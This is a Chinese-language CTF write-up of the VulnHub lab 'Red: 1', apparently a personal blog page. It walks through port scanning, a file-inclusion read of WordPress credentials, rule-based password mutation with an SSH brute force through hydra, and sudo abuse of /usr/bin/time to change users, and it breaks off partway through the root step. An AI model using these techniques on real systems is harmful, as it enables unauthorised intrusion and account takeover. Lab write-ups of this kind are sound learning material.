---
sidebar_position: 1
tags: [Easy, Linux, LFI, 密码破解-账号, SUDO, 定时任务]
title: "Red: 1"
sidebar_label: "Red: 1"
description: 基本就是个废机器, 稍微操作一下就死机
---
# Red: 1
## 端口扫描
```bash
jtz@attacker:~/CTF/VulhHub$ nmap -sTCV -p- --min-rate 1000 192.168.1.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-17 19:04 CST
Nmap scan report for red (192.168.1.12)
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d5365835252c4127249be335dd1e71c (RSA)
|   256 06610a49864364cab00c0f09177b33ba (ECDSA)
|_  256 9b8d90472ac1dc11287d57e08a23b469 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.8.1
|_http-title: Hacked By Red &#8211; Your site has been Hacked! You\xE2\x80\x99ll neve...
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
```
## HTTP - 90
访问页面后发现我们需要将一个域名加入到 host 中, 查看主页内容显示, 我们可以知道这个主机是被黑客入侵我们需要借此来进行反打, 使用相关字典进行扫描, 最终发现一个页面 `NetworkFileManagerPHP.php `
```bash
jtz@attacker:~/CTF/VulhHub$ gobuster dir -u http://redrocks.win/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://redrocks.win/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/12/17 21:09:27 Starting gobuster in directory enumeration mode
===============================================================
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
Progress: 1683 / 1692 (99.47%)
===============================================================
2023/12/17 21:09:48 Finished
===============================================================
```
经过查看发现这个程序应该是读取文件的, 估计存在 LFI 漏洞, 我们可以进行扫描, 建议扫描的时候悠点, 这机器死的速度太快了, 经过扫描可以发现一个参数 key 我们可以借此来读取文件, 之后我读取了这个后门文件看看有没有什么发现, 但是我在其中发现了一句使用 base64 加密的内容其解密后为
```bash
That password alone won't help you! Hashcat says rules are rules
```
这告诉我们对应的密码是基于某种规则生成, 根据这个内容是 Base64 加密得到的, 我们可以退则这是一个 base64 规则生成的密码, 我们可能唯一获取的密码就是一个数据库配置文件的密码了,读取这个文件

```bash
/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
```

这是其中一个用户, 对应就是使用 `R3v_m4lwh3r3_k1nG!!` 产生一些密码规则借此来爆破 john 用户

```bash
jtz@attacker:~/CTF/VulhHub$ hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
jtz@attacker:~/CTF/VulhHub$ wc -l passlist.txt 
77 passlist.txt
```

## 后渗透
### john
使用上面得到的密码来进行暴力破解, 我们可以得到一个密码, 自此进行登陆, 同时还有一个问题就是这个账户密码会定时修改, 因此需要写后门

```bash
jtz@attacker:~/CTF/VulhHub$ hydra -l john -P passlist.txt ssh://192.168.1.6
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-17 21:55:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://192.168.1.6:22/
[22][ssh] host: 192.168.1.6   login: john   password: R3v_m4lwh3r3_k1nG!!00
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-17 21:55:45
jtz@attacker:~/CTF/VulhHub$ ssh john@192.168.1.6
john@192.168.1.6's password: 
Permission denied, please try again.
john@192.168.1.6's password: 
Last login: Wed Oct 27 02:05:25 2021 from 10.0.2.15
john@red:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
```

### john —> ippsec

我发现 john 用户可以使用 ippsec 身份运行一个程序, 而恰巧对应的程序可以进行提权

```bash
john@red:~$ sudo -l
Matching Defaults entries for john on red:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on red:
    (ippsec) NOPASSWD: /usr/bin/time
john@red:~$ sudo -u ippsec /usr/bin/time /bin/sh
$ id
uid=1001(ippsec) gid=1001(ippsec) groups=1001(ippsec)
```

### ippsec —> root
之后我上传了 pspy 发现了一些奇怪的定时任务
![20240522162100](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240522162100.png)
之后我查看这个目录, 发现其需要 ippsec 用户才可以访问, 我们可以借助 ippsec 用户组的身份来修改这个 `supersecretfileuc.c` 文件使其实现提权操作
```bash
$ ls -al
total 32
drwxrwx--- 2 root     ippsec    4096 Dec 17 14:10 .
drwxr-xr-x 6 www-data www-data  4096 Oct 31  2021 ..
-rwxr-xr-x 1 root     root     16712 Dec 17 14:10 rev
-rw-r--r-- 1 root     root       123 Oct 31  2021 supersecretfileuc.c
$ cat sYou really think you can take down my machine Blue?

$ vim -h
vim: invalid option -- 'h'
Try 'vim --help' for more information.
$ vim su*       
#include <stdio.h>
  
int main()
{
  
    // prints hello world
    printf("Get out of here Blue!\n");
  
    return 0;
}
```
![20240522162135](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240522162135.png)